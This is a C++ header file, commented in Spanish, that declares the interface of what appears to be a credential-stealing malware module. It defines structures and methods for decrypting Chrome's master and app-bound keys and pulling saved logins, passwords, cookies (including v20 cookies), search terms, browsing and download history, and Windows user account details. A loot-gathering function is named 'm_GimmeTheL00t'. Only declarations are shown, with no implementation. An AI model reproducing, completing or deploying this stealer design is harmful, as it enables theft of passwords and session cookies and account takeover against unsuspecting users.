#ifdef __MOD_INFO

#ifndef __MOD_INF
#define __MOD_INF 1

#include "headers.hpp"
#include<LMaccess.h>
#include<LMerr.h>
#include<LMAPIbuf.h>
#include<bcrypt.h>
#include<wincrypt.h>
#include "mod_dynamic_load.hpp"
#include "../json/json.hpp"
#include "../sqlite3/sqlite3.h"
#include "../base64/base64.h"

struct Chrome_History {
	std::string strURL;
	std::string strTitle;
	std::string strVisitCount;
	std::string strLastVisitTime;
};

struct Chrome_Download_History {
	std::string strTargetPath;
	std::string strStartTime;
	std::string strTotalBytes;
	std::string strTabURL;
	std::string strMimeType;
};

struct Chrome_Search_Terms {
	std::string strTerm;
};

struct Chrome_Login_Data {
	std::string strUrl;
	std::string strAction;
	std::string strUser;
	std::string strPassword;
};

struct Cookie {
	std::string strCreationUTC;
	std::string strHostKey;
	std::string strName;
	std::string strValue;
	std::string strPath;
	std::string strExpiresUTC;
	std::string strLastAccessUTC;
	std::string strLastUpdateUTC;
};

struct Chrome_Profile {
	std::string strPath;
	std::string strName;
	std::string strGaiaName;
	std::string strShortCutName;
	std::string strUserName;
	std::string strHostedDomain;
};

struct User_Info {
	std::string strUserName;
	std::string strComment;
	std::string strFullName;
	DWORD dwPasswordAge;
	std::string strHomeDir;
	DWORD dwLastLogon;
	DWORD dwLastLogOff;
	DWORD dwBadPwCount;
	DWORD dwNumLogons;
	std::string strLogonServer;
	DWORD dwCountryCode;
};

class mod_Info {	
	public:
		void testData();
		///////////////////////////////////////////////
		///             GOOGLE CHROME               ///
		///////////////////////////////////////////////
		//Primero llamar a esta funcion la cual obtiene los perfiles y la llave maestra
		std::vector<Chrome_Profile> m_ChromeProfiles();
		///////////////////////////////////////////////
		///////////////////////////////////////////////

		std::string m_GetProfileData(const std::string& strPath, const char cOption);

		std::string m_GetUsersData();

		mod_Info(st_Bcrypt& _bcrypt, st_Crypt32& _crypt32, st_Netapi32& _netapi32, st_Kernel32& _kernel32);
		~mod_Info();

	private:
		st_Bcrypt     BCRYPT;
		st_Crypt32   CRYPT32;
		st_Netapi32 NETAPI32;
		st_Kernel32 KERNEL32;

		std::vector<std::vector<std::string>> m_GimmeTheL00t(const char* cQuery, const char* cPath);
		///////////////////////////////////////////////
		///             GOOGLE CHROME               ///
		///////////////////////////////////////////////
		BCRYPT_ALG_HANDLE hAlgorithm = 0;
		BCRYPT_KEY_HANDLE hKey       = 0;
		BCRYPT_KEY_HANDLE hKey2      = 0;

		//Datos de perfiles
		std::vector<Chrome_Login_Data> m_ProfilePasswords(const std::string& strUserPath);
		std::vector<Cookie> m_ProfileCookies(const std::string& strUserPath);
		std::vector<Chrome_Search_Terms> m_ProfileSearchTerms(const std::string& strUserPath);
		std::vector<Chrome_History> m_ProfileBrowsingHistory(const std::string& strUserPath);
		std::vector<Chrome_Download_History> m_ProfileDownloadHistory(const std::string& strUserPath);

		//Descifrar llave maestra y datos cifrados
		std::string m_DecryptMasterKey(const std::string& strPass);
		std::string m_DecryptData(const std::string& strPass);

		//Vector que aloja llave maestra
		std::vector<unsigned char> vcChromeKey;
		std::vector<unsigned char> vcBoundKey; //para desencriptar v20 cookies

		//Vector que aloja informacion de perfiles
		std::vector<Chrome_Profile> vcChromeProfiles;
		///////////////////////////////////////////////
		///////////////////////////////////////////////

		std::string toString(const LPWSTR& _strin);
		
		std::vector<User_Info> m_Usuarios();

		std::string strBasePath = "";

		bool isBcrptOK = false;

};

#endif

#endif